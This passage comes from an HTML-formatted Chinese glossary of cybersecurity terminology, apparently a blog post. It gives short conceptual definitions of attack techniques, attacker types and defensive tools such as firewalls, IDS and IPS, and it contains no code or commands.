0);">被设计来达到非授权控制计算机或窃取计算机数据等多种恶意行为的程序。</font></p><h3 id="间谍软件"><a href="#间谍软件" class="headerlink" title="间谍软件        "></a><font style="color:rgb(0, 0, 0);">间谍软件        </font></h3><p><font style="color:rgb(0, 0, 0);">一种能够在用户不知情的情况下，在其电脑、手机上安装后门，具备收集用户信息、监听、偷拍等功能的软件。</font></p><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a><font style="color:rgb(0, 0, 0);">后门</font></h3><p><font style="color:rgb(0, 0, 0);">这是一种形象的比喻，入侵者在利用某些方法成功的控制了目标主机后，可以在对方的系统中植入特定的程序，或者是修改某些设置，用于访问、查看或者控制这台主机。</font></p><p><font style="color:rgb(0, 0, 0);">这些改动表面上是很难被察觉的，就好象是入侵者偷偷的配了一把主人房间的钥匙，或者在不起眼处修了一条按到，可以方便自身随意进出。</font></p><p><font style="color:rgb(0, 0, 0);">通常大多数木马程序都可以被入侵者用于创建后门（BackDoor）。</font></p><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a><font style="color:rgb(0, 0, 0);">弱口令</font></h3><p><font style="color:rgb(0, 0, 0);">指那些强度不够，容易被猜解的，类似123，abc这样的口令（密码）。</font></p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a><font style="color:rgb(0, 0, 0);">漏洞</font></h3><p><font style="color:rgb(0, 0, 0);">漏洞是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统。<br></font><font style="color:rgb(0, 0, 0);">奇安信集团董事长齐向东在《漏洞》一书中指出，软件的缺陷是漏洞的一个主要来源，缺陷是天生的，漏洞是不可避免的。</font></p><h3 id="远程命令执行漏洞"><a href="#远程命令执行漏洞" class="headerlink" title="远程命令执行漏洞"></a><font style="color:rgb(0, 0, 0);">远程命令执行漏洞</font></h3><p><font style="color:rgb(0, 0, 0);">由于系统设计实现上存在的漏洞，攻击者可能通过发送特定的请求或数据导致在受影响的系统上执行攻击者指定的任意命令。</font></p><h3 id="0day漏洞"><a href="#0day漏洞" class="headerlink" title="0day漏洞"></a><font style="color:rgb(0, 0, 0);">0day漏洞</font></h3><p><font style="color:rgb(0, 0, 0);">0day漏洞最早的破解是专门针对软件的，叫做WAREZ，后来才发展到游戏，音乐，影视等其他内容的。<br></font><font style="color:rgb(0, 0, 0);">0day中的0表示Zero，早期的0day表示在软件发行后的24小时内就出现破解版本。<br></font><font style="color:rgb(0, 0, 0);">在网络攻防的语境下，0day漏洞指那些已经被攻击者发现掌握并开始利用，但还没有被包括受影响软件厂商在内的公众所知的漏洞，这类漏洞对攻击者来说有完全的信息优势，由于没有漏洞的对应的补丁或临时解决方案，防守方不知道如何防御，攻击者可以达成最大可能的威胁。</font></p><h3 id="1day漏洞"><a href="#1day漏洞" class="headerlink" title="1day漏洞"></a><font style="color:rgb(0, 0, 0);">1day漏洞</font></h3><p><font style="color:rgb(0, 0, 0);">指漏洞信息已公开但仍未发布补丁的漏洞。此类漏洞的危害仍然较高，但往往官方会公布部分缓解措施，如关闭部分端口或者服务等。</font></p><h3 id="Nday漏洞"><a href="#Nday漏洞" class="headerlink" title="Nday漏洞"></a><font style="color:rgb(0, 0, 0);">Nday漏洞</font></h3><p><font style="color:rgb(0, 0, 0);">指已经发布官方补丁的漏洞。通常情况下，此类漏洞的防护只需更新补丁即可，但由于多种原因，导致往往存在大量设备漏洞补丁更新不及时，且漏洞利用方式已经在互联网公开，往往此类漏洞是黑客最常使用的漏洞。<br></font><font style="color:rgb(0, 0, 0);">例如在永恒之蓝事件中，微软事先已经发布补丁，但仍有大量用户中招。</font></p><h2 id="2．攻击方法"><a href="#2．攻击方法" class="headerlink" title="2．攻击方法"></a><font style="color:rgb(0, 0, 0);">2．攻击方法</font></h2><h3 id="挂马"><a href="#挂马" class="headerlink" title="挂马"></a><font style="color:rgb(0, 0, 0);">挂马</font></h3><p><font style="color:rgb(0, 0, 0);">就是在别人的网站文件里面放入网页木马或者是将代码潜入到对方正常的网页文件里，以使浏览者中马。</font></p><h3 id="挖洞"><a href="#挖洞" class="headerlink" title="挖洞"></a><font style="color:rgb(0, 0, 0);">挖洞</font></h3><p><font style="color:rgb(0, 0, 0);">指漏洞挖掘。</font></p><h3 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a><font style="color:rgb(0, 0, 0);">加壳</font></h3><p><font style="color:rgb(0, 0, 0);">就是利用特殊的算法，将EXE可执行程序或者DLL动态连接库文件的编码进行改变（比如实现压缩、加密），以达到缩小文件体积或者加密程序编码，甚至是躲过杀毒软件查杀的目的。<br></font><font style="color:rgb(0, 0, 0);">目前较常用的壳有UPX，ASPack、PePack、PECompact、UPack、免疫007、木马彩衣等等。</font></p><h3 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a><font style="color:rgb(0, 0, 0);">溢出</font></h3><p><font style="color:rgb(0, 0, 0);">简单的解释就是程序对输入数据没有执行有效的边界检测而导致错误，后果可能是造成程序崩溃或者是执行攻击者的命令。</font></p><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a><font style="color:rgb(0, 0, 0);">缓冲区溢出</font></h3><p><font style="color:rgb(0, 0, 0);">攻击者向一个地址区输入这个区间存储不下的大量字符。在某些情况下，这些多余的字符可以作为“执行代码”来运行，因此足以使攻击者不受安全措施限制而获得计算机的控制权。</font></p><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a><font style="color:rgb(0, 0, 0);">注入</font></h3><p><font style="color:rgb(0, 0, 0);">Web安全头号大敌。攻击者把一些包含攻击代码当做命令或者查询语句发送给解释器，这些恶意数据可以欺骗解释器，从而执行计划外的命令或者未授权访问数据。<br></font><font style="color:rgb(0, 0, 0);">注入攻击漏洞往往是应用程序缺少对输入进行安全性检查所引起的。注入漏洞通常能在SQL查询、LDAP查询、OS命令、程序参数等中出现。</font></p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><font style="color:rgb(0, 0, 0);">SQL注入</font></h3><p><font style="color:rgb(0, 0, 0);">注入攻击最常见的形式，主要是指Web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在Web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询或其他操作，导致数据库信息泄露或非授权操作数据表。</font></p><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a><font style="color:rgb(0, 0, 0);">注入点</font></h3><p><font style="color:rgb(0, 0, 0);">即可以实行注入的地方，通常是一个涉及访问数据库的应用链接。根据注入点数据库的运行帐号的权限的不同，你所得到的权限也不同。</font></p><h3 id="软件脱壳"><a href="#软件脱壳" class="headerlink" title="软件脱壳"></a><font style="color:rgb(0, 0, 0);">软件脱壳</font></h3><p><font style="color:rgb(0, 0, 0);">顾名思义，就是利用相应的工具，把在软件“外面”起保护作用的“壳”程序去除，还文件本来面目，这样再修改文件内容或进行分析检测就容易多了。</font></p><h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a><font style="color:rgb(0, 0, 0);">免杀</font></h3><p><font style="color:rgb(0, 0, 0);">就是通过加壳、加密、修改特征码、加花指令等等技术来修改程序，使其逃过杀毒软件的查杀。</font></p><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a><font style="color:rgb(0, 0, 0);">暴力破解</font></h3><p><font style="color:rgb(0, 0, 0);">简称“爆破”。黑客对系统中账号的每一个可能的密码进行高度密集的自动搜索，从而破坏安全并获得对计算机的访问权限。</font></p><h3 id="洪水攻击"><a href="#洪水攻击" class="headerlink" title="洪水攻击"></a><font style="color:rgb(0, 0, 0);">洪水攻击</font></h3><p><font style="color:rgb(0, 0, 0);">是黑客比较常用的一种攻击技术，特点是实施简单，威力巨大，大多是无视防御的。<br></font><font style="color:rgb(0, 0, 0);">从定义上说，攻击者对网络资源发送过量数据时就发生了洪水攻击，这个网络资源可以是router，switch，host，application等。<br></font><font style="color:rgb(0, 0, 0);">洪水攻击将攻击流量比作成洪水，只要攻击流量足够大，就可以将防御手段打穿。<br></font><font style="color:rgb(0, 0, 0);">DDoS攻击便是洪水攻击的一种。</font></p><h3 id="SYN攻击"><a href="#SYN攻击" class="headerlink" title="SYN攻击"></a><font style="color:rgb(0, 0, 0);">SYN攻击</font></h3><p><font style="color:rgb(0, 0, 0);">利用操作系统TCP协调设计上的问题执行的拒绝服务攻击，涉及TCP建立连接时三次握手的设计。</font></p><h3 id="DoS攻击"><a href="#DoS攻击" class="headerlink" title="DoS攻击"></a><font style="color:rgb(0, 0, 0);">DoS攻击</font></h3><p><font style="color:rgb(0, 0, 0);">拒绝服务攻击。攻击者通过利用漏洞或发送大量的请求导致攻击对象无法访问网络或者网站无法被访问。</font></p><h3 id="DDoS"><a href="#DDoS" class="headerlink" title="DDoS"></a><font style="color:rgb(0, 0, 0);">DDoS</font></h3><p><font style="color:rgb(0, 0, 0);">分布式DOS攻击，常见的UDP、SYN、反射放大攻击等等，就是通过许多台肉鸡一起向你发送一些网络请求信息，导致你的网络堵塞而不能正常上网。</font></p><h3 id="抓鸡"><a href="#抓鸡" class="headerlink" title="抓鸡"></a><font style="color:rgb(0, 0, 0);">抓鸡</font></h3><p><font style="color:rgb(0, 0, 0);">即设法控制电脑，将其沦为肉鸡。</font></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a><font style="color:rgb(0, 0, 0);">端口扫描</font></h3><p><font style="color:rgb(0, 0, 0);">端口扫描是指发送一组端口扫描消息，通过它了解到从哪里可探寻到攻击弱点，并了解其提供的计算机网络服务类型，试图以此侵入某台计算机。</font></p><h3 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a><font style="color:rgb(0, 0, 0);">花指令</font></h3><p><font style="color:rgb(0, 0, 0);">通过加入不影响程序功能的多余汇编指令，使得杀毒软件不能正常的判断病毒文件的构造。说通俗点就是“杀毒软件是从头到脚按顺序来识别病毒。如果我们把病毒的头和脚颠倒位置，杀毒软件就找不到病毒了”。</font></p><h3 id="反弹端口"><a href="#反弹端口" class="headerlink" title="反弹端口"></a><font style="color:rgb(0, 0, 0);">反弹端口</font></h3><p><font style="color:rgb(0, 0, 0);">有人发现，防火墙对于连入的连接往往会进行非常严格的过滤，但是对于连出的连接却疏于防范。<br></font><font style="color:rgb(0, 0, 0);">于是，利用这一特性，反弹端口型软件的服务端(被控制端)会主动连接客户端(控制端)，就给人“被控制端主动连接控制端的假象，让人麻痹大意。</font></p><h3 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a><font style="color:rgb(0, 0, 0);">网络钓鱼</font></h3><p><font style="color:rgb(0, 0, 0);">攻击者利用欺骗性的电子邮件或伪造的Web 站点等来进行网络诈骗活动。<br></font><font style="color:rgb(0, 0, 0);">诈骗者通常会将自己伪装成网络银行、在线零售商和信用卡公司等可信的品牌，骗取用户的私人信息或邮件账号口令。<br></font><font style="color:rgb(0, 0, 0);">受骗者往往会泄露自己的邮箱、私人资料，如信用卡号、银行卡账户、身份证号等内容。</font></p><h3 id="鱼叉攻击"><a href="#鱼叉攻击" class="headerlink" title="鱼叉攻击"></a><font style="color:rgb(0, 0, 0);">鱼叉攻击</font></h3><p><font style="color:rgb(0, 0, 0);">鱼叉攻击是将用鱼叉捕鱼形象的引入到了网络攻击中，主要是指可以使欺骗性电子邮件看起来更加可信的网络钓鱼攻击，具有更高的成功可能性。<br></font><font style="color:rgb(0, 0, 0);">不同于撒网式的网络钓鱼，鱼叉攻击往往更加具备针对性，攻击者往往“见鱼而使叉”。<br></font><font style="color:rgb(0, 0, 0);">为了实现这一目标，攻击者将尝试在目标上收集尽可能多的信息。通常，组织内的特定个人存在某些安全漏洞。</font></p><h3 id="钓鲸攻击"><a href="#钓鲸攻击" class="headerlink" title="钓鲸攻击"></a><font style="color:rgb(0, 0, 0);">钓鲸攻击</font></h3><p><font style="color:rgb(0, 0, 0);">捕鲸是另一种进化形式的鱼叉式网络钓鱼。它指的是针对高级管理人员和组织内其他高级人员的网络钓鱼攻击。<br></font><font style="color:rgb(0, 0, 0);">通过使电子邮件内容具有个性化并专门针对相关目标进行定制的攻击。</font></p><h3 id="水坑攻击"><a href="#水坑攻击" class="headerlink" title="水坑攻击"></a><font style="color:rgb(0, 0, 0);">水坑攻击</font></h3><p><font style="color:rgb(0, 0, 0);">顾名思义，是在受害者必经之路设置了一个“水坑(陷阱)”。<br></font><font style="color:rgb(0, 0, 0);">最常见的做法是，黑客分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，先将此网站“攻破”并植入攻击代码，一旦攻击目标访问该网站就会“中招”。</font></p><h3 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a><font style="color:rgb(0, 0, 0);">嗅探</font></h3><p><font style="color:rgb(0, 0, 0);">嗅探指的是对局域网中的数据包进行截取及分析，从中获取有效信息。</font></p><h3 id="APT攻击"><a href="#APT攻击" class="headerlink" title="APT攻击"></a><font style="color:rgb(0, 0, 0);">APT攻击</font></h3><p><font style="color:rgb(0, 0, 0);">Advanced Persistent Threat，即高级可持续威胁攻击，指某组织在网络上对特定对象展开的持续有效的攻击活动。<br></font><font style="color:rgb(0, 0, 0);">这种攻击活动具有极强的隐蔽性和针对性，通常会运用受感染的各种介质、供应链和社会工程学等多种手段实施先进的、持久的且有效的威胁和攻击。</font></p><h3 id="C2"><a href="#C2" class="headerlink" title="C2"></a><font style="color:rgb(0, 0, 0);">C2</font></h3><p><font style="color:rgb(0, 0, 0);">C2 全称为Command and Control，命令与控制，常见于APT攻击场景中。作动词解释时理解为恶意软件与攻击者进行交互，作名词解释时理解为攻击者的“基础设施”。</font></p><h3 id="供应链攻击"><a href="#供应链攻击" class="headerlink" title="供应链攻击"></a><font style="color:rgb(0, 0, 0);">供应链攻击</font></h3><p><font style="color:rgb(0, 0, 0);">是黑客攻击目标机构的合作伙伴，并以该合作伙为跳板，达到渗透目标用户的目的。<br></font><font style="color:rgb(0, 0, 0);">一种常见的表现形式为，用户对厂商产品的信任，在厂商产品下载安装或者更新时进行恶意软件植入进行攻击。<br></font><font style="color:rgb(0, 0, 0);">所以，在某些软件下载平台下载的时候，若遭遇捆绑软件，就得小心了！</font></p><h3 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a><font style="color:rgb(0, 0, 0);">社会工程学</font></h3><p><font style="color:rgb(0, 0, 0);">一种无需依托任何黑客软件，更注重研究人性弱点的黑客手法正在兴起，这就是社会工程学黑客技术。<br></font><font style="color:rgb(0, 0, 0);">通俗而言是指利用人的社会学弱点实施网络攻击的一整套方法论，其攻击手法往往出乎人意料。<br></font><font style="color:rgb(0, 0, 0);">世界第一黑客凯文·米特尼克在《反欺骗的艺术》中曾提到，人为因素才是安全的软肋。很多企业、公司在信息安全上投入大量的资金，最终导致数据泄露的原因，往往却是发生在人本身。</font></p><h3 id="拿站"><a href="#拿站" class="headerlink" title="拿站"></a><font style="color:rgb(0, 0, 0);">拿站</font></h3><p><font style="color:rgb(0, 0, 0);">指得到一个网站的最高权限，即得到后台和管理员名字和密码。</font></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a><font style="color:rgb(0, 0, 0);">提权</font></h3><p><font style="color:rgb(0, 0, 0);">指得到你本没得到的权限，比如说电脑中非系统管理员就无法访问一些C盘的东西，而系统管理员就可以，通过一定的手段让普通用户提升成为管理员，让其拥有管理员的权限，这就叫提权。</font></p><h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a><font style="color:rgb(0, 0, 0);">渗透</font></h3><p><font style="color:rgb(0, 0, 0);">就是通过扫描检测你的网络设备及系统有没有安全漏洞，有的话就可能被入侵，就像一滴水透过一块有漏洞的木板，渗透成功就是系统被入侵。</font></p><h3 id="横移"><a href="#横移" class="headerlink" title="横移"></a><font style="color:rgb(0, 0, 0);">横移</font></h3><p><font style="color:rgb(0, 0, 0);">指攻击者入侵后，从立足点在内部网络进行拓展，搜寻控制更多的系统。</font></p><h3 id="跳板"><a href="#跳板" class="headerlink" title="跳板"></a><font style="color:rgb(0, 0, 0);">跳板</font></h3><p><font style="color:rgb(0, 0, 0);">一个具有辅助作用的机器，利用这个主机作为一个间接工具，来入侵其他主机，一般和肉鸡连用。</font></p><h3 id="网马"><a href="#网马" class="headerlink" title="网马"></a><font style="color:rgb(0, 0, 0);">网马</font></h3><p><font style="color:rgb(0, 0, 0);">就是在网页中植入木马，当打开网页的时候就运行了木马程序。</font></p><h3 id="黑页"><a href="#黑页" class="headerlink" title="黑页"></a><font style="color:rgb(0, 0, 0);">黑页</font></h3><p><font style="color:rgb(0, 0, 0);">黑客攻击成功后，在网站上留下的黑客入侵成功的页面，用于炫耀攻击成果。</font></p><h3 id="暗链"><a href="#暗链" class="headerlink" title="暗链"></a><font style="color:rgb(0, 0, 0);">暗链</font></h3><p><font style="color:rgb(0, 0, 0);">看不见的网站链接，“暗链”在网站中的链接做得非常隐蔽，短时间内不易被搜索引擎察觉。<br></font><font style="color:rgb(0, 0, 0);">它和友情链接有相似之处，可以有效地提高网站权重。</font></p><h3 id="拖库"><a href="#拖库" class="headerlink" title="拖库"></a><font style="color:rgb(0, 0, 0);">拖库</font></h3><p><font style="color:rgb(0, 0, 0);">拖库本来是数据库领域的术语，指从数据库中导出数据。<br></font><font style="color:rgb(0, 0, 0);">在网络攻击领域，它被用来指网站遭到入侵后，黑客窃取其数据库文件。</font></p><h3 id="撞库"><a href="#撞库" class="headerlink" title="撞库"></a><font style="color:rgb(0, 0, 0);">撞库</font></h3><p><font style="color:rgb(0, 0, 0);">撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登陆其他网站后，得到一系列可以登录的用户。<br></font><font style="color:rgb(0, 0, 0);">很多用户在不同网站使用的是相同的帐号密码，因此黑客可以通过获取用户在A网站的账户从而尝试登录B网址，这就可以理解为撞库攻击。</font></p><h3 id="暴库"><a href="#暴库" class="headerlink" title="暴库"></a><font style="color:rgb(0, 0, 0);">暴库</font></h3><p><font style="color:rgb(0, 0, 0);">入侵网站的一种手法，通过恶意代码让网站爆出其一些敏感数据来。</font></p><h3 id="CC攻击"><a href="#CC攻击" class="headerlink" title="CC攻击"></a><font style="color:rgb(0, 0, 0);">CC攻击</font></h3><p><font style="color:rgb(0, 0, 0);">即Challenge Collapsar，名字来源于对抗国内安全厂商绿盟科技早期的抗拒绝服务产品黑洞，攻击者借助代理服务器生成指向受害主机的涉及大量占用系统资源的合法请求，耗尽目标的处理资源，达到拒绝服务的目的。</font></p><h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a><font style="color:rgb(0, 0, 0);">Webshell</font></h3><p><font style="color:rgb(0, 0, 0);">Webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做是一种网页后门，可以上传下载文件，查看数据库，执行任意程序命令等。</font></p><h3 id="跨站攻击"><a href="#跨站攻击" class="headerlink" title="跨站攻击"></a><font style="color:rgb(0, 0, 0);">跨站攻击</font></h3><p><font style="color:rgb(0, 0, 0);">通常简称为XSS，是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。</font></p><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a><font style="color:rgb(0, 0, 0);">中间人攻击</font></h3><p><font style="color:rgb(0, 0, 0);">中间人攻击是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而这台计算机就称为“中间人”。</font></p><h3 id="薅羊毛"><a href="#薅羊毛" class="headerlink" title="薅羊毛"></a><font style="color:rgb(0, 0, 0);">薅羊毛</font></h3><p><font style="color:rgb(0, 0, 0);">指网赚一族利用各种网络金融产品或红包活动推广下线抽成赚钱，又泛指搜集各个银行等金融机构及各类商家的优惠信息，以此实现盈利的目的。这类行为就被称之为薅羊毛。</font></p><h3 id="商业电子邮件攻击（BEC）"><a href="#商业电子邮件攻击（BEC）" class="headerlink" title="商业电子邮件攻击（BEC）"></a><font style="color:rgb(0, 0, 0);">商业电子邮件攻击（BEC）</font></h3><p><font style="color:rgb(0, 0, 0);">也被称为“变脸诈骗”攻击，这是针对高层管理人员的攻击，攻击者通常冒充（盗用）决策者的邮件，来下达与资金、利益相关的指令；或者攻击者依赖社会工程学制作电子邮件，说服&#x2F;诱导高管短时间进行经济交易。</font></p><h3 id="电信诈骗"><a href="#电信诈骗" class="headerlink" title="电信诈骗"></a><font style="color:rgb(0, 0, 0);">电信诈骗</font></h3><p><font style="color:rgb(0, 0, 0);">是指通过电话、网络和短信方式，编造虚假信息，设置骗局，对受害人实施远程、非接触式诈骗，诱使受害人打款或转账的犯罪行为，通常以冒充他人及仿冒、伪造各种合法外衣和形式的方式达到欺骗的目的。</font></p><h3 id="杀猪盘"><a href="#杀猪盘" class="headerlink" title="杀猪盘"></a><font style="color:rgb(0, 0, 0);">杀猪盘</font></h3><p><font style="color:rgb(0, 0, 0);">网络流行词，电信诈骗的一种，是一种网络交友诱导股票投资、赌博等类型的诈骗方式，“杀猪盘”则是“从业者们”自己起的名字，是指放长线“养猪”诈骗，养得越久，诈骗得越狠。</font></p><h3 id="ARP攻击"><a href="#ARP攻击" class="headerlink" title="ARP攻击"></a><font style="color:rgb(0, 0, 0);">ARP攻击</font></h3><p><font style="color:rgb(0, 0, 0);">ARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的进行。<br></font><font style="color:rgb(0, 0, 0);">基于ARP协议的这一工作特性，黑客向对方计算机不断发送有欺诈性质的ARP数据包，数据包内包含有与当前设备重复的Mac地址，使对方在回应报文时，由于简单的地址重复错误而导致不能进行正常的网络通信。</font></p><h3 id="欺骗攻击"><a href="#欺骗攻击" class="headerlink" title="欺骗攻击"></a><font style="color:rgb(0, 0, 0);">欺骗攻击</font></h3><p><font style="color:rgb(0, 0, 0);">网络欺骗的技术主要有：HONEYPOT和分布式HONEYPOT、欺骗空间技术等。<br></font><font style="color:rgb(0, 0, 0);">主要方式有：IP欺骗、ARP欺骗、 DNS欺骗、Web欺骗、电子邮件欺骗、源路由欺骗（通过指定路由，以假冒身份与其他主机进行合法通信或发送假报文，使受攻击主机出现错误动作）、地址欺骗（包括伪造源地址和伪造中间站点）等。</font></p><h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a><font style="color:rgb(0, 0, 0);">Shellcode</font></h3><p><font style="color:rgb(0, 0, 0);">一段可被操作系统无需特别定位处理的指令，通常在利用软件漏洞后执行的恶意代码，shellcode为二进制的机器码，因为经常让攻击者获得shell而得名。</font></p><h3 id="物理攻击"><a href="#物理攻击" class="headerlink" title="物理攻击"></a><font style="color:rgb(0, 0, 0);">物理攻击</font></h3><p><font style="color:rgb(0, 0, 0);">通俗理解，即采用物理接触而非技术手段达到网络入侵的目的，最常见的表现形式为插U盘。<br></font><font style="color:rgb(0, 0, 0);">著名的震网病毒事件即通过插U盘的形式，感染了伊朗核设施。</font></p><h2 id="3．攻击者"><a href="#3．攻击者" class="headerlink" title="3．攻击者"></a><font style="color:rgb(0, 0, 0);">3．攻击者</font></h2><h3 id="黑产"><a href="#黑产" class="headerlink" title="黑产"></a><font style="color:rgb(0, 0, 0);">黑产</font></h3><p><font style="color:rgb(0, 0, 0);">网络黑产，指以互联网为媒介，以网络技术为主要手段，为计算机信息系统安全和网络空间管理秩序，甚至国家安全、社会政治稳定带来潜在威胁（重大安全隐患）的非法行为。<br></font><font style="color:rgb(0, 0, 0);">例如非法数据交易产业。</font></p><h3 id="暗网"><a href="#暗网" class="headerlink" title="暗网"></a><font style="color:rgb(0, 0, 0);">暗网</font></h3><p><font style="color:rgb(0, 0, 0);">暗网是利用加密传输、P2P对等网络、多点中继混淆等，为用户提供匿名的互联网信息访问的一类技术手段，其最突出的特点就是匿名性。</font></p><h3 id="黑帽黑客"><a href="#黑帽黑客" class="headerlink" title="黑帽黑客"></a><font style="color:rgb(0, 0, 0);">黑帽黑客</font></h3><p><font style="color:rgb(0, 0, 0);">以非法目的进行黑客攻击的人，通常是为了经济利益。他们进入安全网络以销毁、赎回、修改或窃取数据，或使网络无法用于授权用户。<br></font><font style="color:rgb(0, 0, 0);">这个名字来源于这样一个历史：老式的黑白西部电影中，恶棍很容易被电影观众识别，因为他们戴着黑帽子，而“好人”则戴着白帽子。</font></p><h3 id="白帽黑客"><a href="#白帽黑客" class="headerlink" title="白帽黑客"></a><font style="color:rgb(0, 0, 0);">白帽黑客</font></h3><p><font style="color:rgb(0, 0, 0);">是那些用自己的黑客技术来进行合法的安全测试分析的黑客，测试网络和系统的性能来判定它们能够承受入侵的强弱程度。</font></p><h3 id="红帽黑客"><a href="#红帽黑客" class="headerlink" title="红帽黑客"></a><font style="color:rgb(0, 0, 0);">红帽黑客</font></h3><p><font style="color:rgb(0, 0, 0);">事实上最为人所接受的说法叫红客。<br></font><font style="color:rgb(0, 0, 0);">红帽黑客以正义、道德、进步、强大为宗旨，以热爱祖国、坚持正义、开拓进取为精神支柱，红客通常会利用自己掌握的技术去维护国内网络的安全，并对外来的进攻进行还击。</font></p><h3 id="红队"><a href="#红队" class="headerlink" title="红队"></a><font style="color:rgb(0, 0, 0);">红队</font></h3><p><font style="color:rgb(0, 0, 0);">通常指攻防演*中的攻击队伍。</font></p><h3 id="蓝队"><a href="#蓝队" class="headerlink" title="蓝队"></a><font style="color:rgb(0, 0, 0);">蓝队</font></h3><p><font style="color:rgb(0, 0, 0);">通常指攻防演*中的防守队伍。</font></p><h3 id="紫队"><a href="#紫队" class="headerlink" title="紫队"></a><font style="color:rgb(0, 0, 0);">紫队</font></h3><p><font style="color:rgb(0, 0, 0);">攻防演<em>中新</em>诞生的一方，通常指监理方或者裁判方。</font></p><p><a href="https://www.cnblogs.com/sunny11/p/13583083.html#_labelTop"><font style="color:rgb(0, 0, 0);">Top</font></a></p><h1 id="二、防守篇"><a href="#二、防守篇" class="headerlink" title="二、防守篇"></a><font style="color:rgb(0, 0, 0);">二、防守篇</font></h1><h2 id="1．软硬件"><a href="#1．软硬件" class="headerlink" title="1．软硬件"></a><font style="color:rgb(0, 0, 0);">1．软硬件</font></h2><h3 id="加密机"><a href="#加密机" class="headerlink" title="加密机"></a><font style="color:rgb(0, 0, 0);">加密机</font></h3><p><font style="color:rgb(0, 0, 0);">主机加密设备，加密机和主机之间使用TCP&#x2F;IP协议通信，所以加密机对主机的类型和主机操作系统无任何特殊的要求。</font></p><h3 id="CA证书"><a href="#CA证书" class="headerlink" title="CA证书"></a><font style="color:rgb(0, 0, 0);">CA证书</font></h3><p><font style="color:rgb(0, 0, 0);">为实现双方安全通信提供了电子认证。<br></font><font style="color:rgb(0, 0, 0);">在因特网、公司内部网或外部网中，使用数字证书实现身份识别和电子信息加密。<br></font><font style="color:rgb(0, 0, 0);">数字证书中含有密钥对（公钥和私钥）所有者的识别信息，通过验证识别信息的真伪实现对证书持有者身份的认证。</font></p><h3 id="SSL证书"><a href="#SSL证书" class="headerlink" title="SSL证书"></a><font style="color:rgb(0, 0, 0);">SSL证书</font></h3><p><font style="color:rgb(0, 0, 0);">SSL证书是数字证书的一种，类似于驾驶证、护照和营业执照的电子副本。<br></font><font style="color:rgb(0, 0, 0);">因为配置在服务器上，也称为SSL服务器证书。</font></p><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a><font style="color:rgb(0, 0, 0);">防火墙</font></h3><p><font style="color:rgb(0, 0, 0);">主要部署于不同网络或网络安全域之间的出口，通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，有选择地接受外部访问。</font></p><h3 id="IDS"><a href="#IDS" class="headerlink" title="IDS"></a><font style="color:rgb(0, 0, 0);">IDS</font></h3><p><font style="color:rgb(0, 0, 0);">入侵检测系统，用于在黑客发起进攻或是发起进攻之前检测到攻击，并加以拦截。<br></font><font style="color:rgb(0, 0, 0);">IDS是不同于防火墙。防火墙只能屏蔽入侵，而IDS却可以在入侵发生以前，通过一些信息来检测到即将发生的攻击或是入侵并作出反应。</font></p><h3 id="NIDS"><a href="#NIDS" class="headerlink" title="NIDS"></a><font style="color:rgb(0, 0, 0);">NIDS</font></h3><p><font style="color:rgb(0, 0, 0);">是Network Intrusion Detection System的缩写，即网络入侵检测系统，主要用于检测Hacker或Cracker 。<br></font><font style="color:rgb(0, 0, 0);">通过网络进行的入侵行为。NIDS的运行方式有两种，一种是在目标主机上运行以监测其本身的通信信息，另一种是在一台单独的机器上运行以监测所有网络设备的通信信息，比如Hub、路由器。</font></p><h3 id="IPS"><a href="#IPS" class="headerlink" title="IPS"></a><font style="color:rgb(0, 0, 0);">IPS</font></h3><p><font style="color:rgb(0, 0, 0);">全称为Intrusion-Prevention System，即入侵防御系统，目的在于及时识别攻击程序或有害代码及其克隆和变种，采取预防措施，先期阻止入侵，防患于未然。<br></font><font style="color:rgb(0, 0, 0);">或者至少使其危害性充分降低。入侵预防系统一般作为防火墙 和防病毒软件的补充来投入使用。</font></p><h3 id="杀毒软件"><a href="#杀毒软件" class="headerlink" title="杀毒软件"></a><font style="color:rgb(0, 0, 0);">杀毒软件</font></h3><p><font style="color:rgb(0, 0, 0);">也称反病毒软件或防毒软件，是用于消除电脑病毒、特洛伊木马和恶意软件等计算机威胁的一类软件。</font></p><h3 id="反病毒引擎"><a href="#反病毒引擎" class="headerlink" title="反病毒引擎"></a><font style="color:rgb(0, 0, 